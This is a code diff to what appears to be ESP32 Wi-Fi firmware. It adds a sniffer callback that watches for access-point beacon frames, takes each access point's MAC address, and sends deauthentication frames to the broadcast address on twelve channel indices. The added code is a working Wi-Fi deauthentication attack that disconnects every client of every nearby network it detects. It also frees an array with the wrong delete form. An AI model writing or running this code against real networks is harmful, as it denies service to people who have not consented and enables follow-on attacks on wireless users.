@@ -10,6 +10,50 @@ namespace CallBackUtils
   }
 }
 
+void deauthapSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
+  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
+  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
+  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
+  int len = snifferPacket->rx_ctrl.sig_len;
+
+  String display_string = "";
+  String essid = "";
+  String bssid = "";
+
+  if (Serial.available() > 0)
+  {
+    SystemManager::getInstance().wifiModule.shutdownWiFi();
+  }
+
+  if (type == WIFI_PKT_MGMT)
+  {
+    len -= 4;
+    int fctl = CallBackUtils::ntohs(frameControl->fctl);
+    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
+    const WifiMgmtHdr *hdr = &ipkt->hdr;
+    int buf = 0;
+
+
+    if ((snifferPacket->payload[0] == 0x80) && (buf == 0))
+    {
+      uint8_t* addr = new uint8_t[6];
+      SystemManager::getInstance().wifiModule.getMACatoffset(addr, snifferPacket->payload, 10);
+#ifdef OLD_LED
+        SystemManager::getInstance().rgbModule->breatheLED(SystemManager::getInstance().rgbModule->redPin, 100);
+#endif
+#ifdef NEOPIXEL_PIN
+SystemManager::getInstance().neopixelModule->breatheLED(SystemManager::getInstance().neopixelModule->strip.Color(255, 0, 0), 300, false);
+#endif
+        uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+        for (int y = 0; y < 12; y++) {
+          SystemManager::getInstance().wifiModule.sendDeauthFrame(addr, y, broadcast_mac);
+        }
+
+        delete addr;
+    }
+  }
+}
+
 void apSnifferCallbackFull(void* buf, wifi_promiscuous_pkt_type_t type) {
   wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
   WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
